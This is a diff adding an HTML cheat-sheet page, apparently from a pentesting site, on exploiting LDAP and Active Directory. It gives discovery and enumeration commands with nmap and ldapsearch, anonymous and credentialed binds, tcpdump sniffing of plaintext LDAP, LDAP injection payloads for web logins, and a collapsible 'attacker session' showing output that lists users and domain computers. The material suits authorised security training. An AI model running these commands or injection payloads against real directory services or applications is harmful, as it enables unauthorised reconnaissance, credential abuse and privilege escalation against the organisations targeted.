@@ -1,0 +1,161 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">LDAP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network Security</strong> • Focus: <strong>Directory Services Exploitation</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    LDAP (Lightweight Directory Access Protocol) is used to query and modify directory services, 
+    most commonly Active Directory in Windows environments. Attackers target LDAP to enumerate 
+    users, groups, and computers, abuse weak authentication, or inject malicious queries. 
+    Misconfigured LDAP often allows unauthenticated or low-privileged users to gather 
+    sensitive information, pivot into credential harvesting, or exploit LDAP Injection 
+    in web apps. Exploitation enables reconnaissance, lateral movement, and privilege escalation.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Anonymous Bind:</strong> Some LDAP servers allow unauthenticated queries.</li>
+    <li><strong>Weak Credentials:</strong> Default or guessable accounts often exist (e.g., service accounts).</li>
+    <li><strong>Excessive Information Disclosure:</strong> Directory objects often reveal usernames, emails, group memberships, and policies.</li>
+    <li><strong>LDAP Injection:</strong> Web apps passing unsanitized input into LDAP queries.</li>
+    <li><strong>Plaintext Traffic:</strong> Without LDAPS (636), credentials and queries can be sniffed.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify LDAP service on TCP/389 (LDAP) or TCP/636 (LDAPS).</li>
+    <li><strong>Anonymous/Weak Bind:</strong> Attempt anonymous or weak authentication.</li>
+    <li><strong>Enumeration:</strong> Query directory objects (users, groups, computers, policies).</li>
+    <li><strong>LDAP Injection:</strong> Exploit vulnerable web applications for unauthorized queries.</li>
+    <li><strong>Post-Exploitation:</strong> Use gathered data for brute-forcing, Kerberoasting, or privilege escalation in AD.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for open LDAP ports (389/636).</li>
+    <li>Attempt anonymous or credentialed LDAP bind.</li>
+    <li>Enumerate users, groups, and policies.</li>
+    <li>Exploit LDAP Injection in web apps if available.</li>
+    <li>Leverage directory information for AD attacks.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p 389,636 --script ldap* [target]       # Detect LDAP services and enumerate
+ldapsearch -x -h [IP] -s base namingcontexts  # Check if anonymous bind works
+
+# ------------------------------
+# Enumeration (Anonymous or Authenticated)
+# ------------------------------
+ldapsearch -x -h [IP] -b "DC=example,DC=com"   # Enumerate directory
+ldapsearch -x -h [IP] -b "DC=example,DC=com" "(objectClass=user)" cn
+ldapsearch -x -h [IP] -b "DC=example,DC=com" "(objectClass=group)" cn
+
+# ------------------------------
+# Authenticated Queries
+# ------------------------------
+ldapsearch -H ldap://[IP] -D "CN=user,DC=example,DC=com" -w [PASS] \
+  -b "DC=example,DC=com" "(objectClass=computer)" cn
+
+# ------------------------------
+# LDAP Injection Testing
+# ------------------------------
+username=*)(|(cn=*))  # Classic LDAP injection payload
+username=admin)(!(password=*))
+
+# ------------------------------
+# Sniffing Plain LDAP
+# ------------------------------
+tcpdump -i eth0 port 389
+wireshark (filter: tcp.port==389)
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p 389 192.168.1.0/24 --script ldap-rootdse  # Scan for LDAP servers
+ldapsearch -x -h 192.168.1.50 -b "DC=corp,DC=local" "(objectClass=user)" cn
+ldapsearch -x -H ldap://192.168.1.50 -D "corp\\admin" -w Passw0rd -b "DC=corp,DC=local"
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p 389 --script ldap-rootdse 192.168.1.50
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-rootdse: 
+|   namingContexts: DC=corp,DC=local
+|_  supportedLDAPVersion: 3
+
+[ saide ~ ]$ ldapsearch -x -h 192.168.1.50 -b "DC=corp,DC=local"
+# Hundreds of entries returned including usernames and groups
+
+[ saide ~ ]$ ldapsearch -x -h 192.168.1.50 -b "DC=corp,DC=local" "(objectClass=user)" cn
+dn: CN=Administrator,CN=Users,DC=corp,DC=local
+cn: Administrator
+dn: CN=jdoe,CN=Users,DC=corp,DC=local
+cn: jdoe
+
+[ saide ~ ]$ ldapsearch -H ldap://192.168.1.50 -D "corp\\jdoe" -w Winter2025! \
+  -b "DC=corp,DC=local" "(objectClass=computer)" cn
+dn: CN=DC01,OU=Domain Controllers,DC=corp,DC=local
+cn: DC01
+dn: CN=WORKSTATION1,OU=Computers,DC=corp,DC=local
+cn: WORKSTATION1
+
+[ saide ~ ]$ # LDAP Injection example in vulnerable web login
+username=*)(|(cn=*)) & password=foo
+# Application returns ALL users — confirming LDAP Injection vulnerability
+
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting LDAP
+      </a>
+    </li>
+    <li>
+      <a href="https://www.openldap.org/doc/admin24/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        OpenLDAP Admin Guide
+      </a>
+    </li>
+    <li>Common in AD red team ops: LDAP enumeration → Kerberoasting → Lateral Movement.</li>
+  </ul>
+</section>
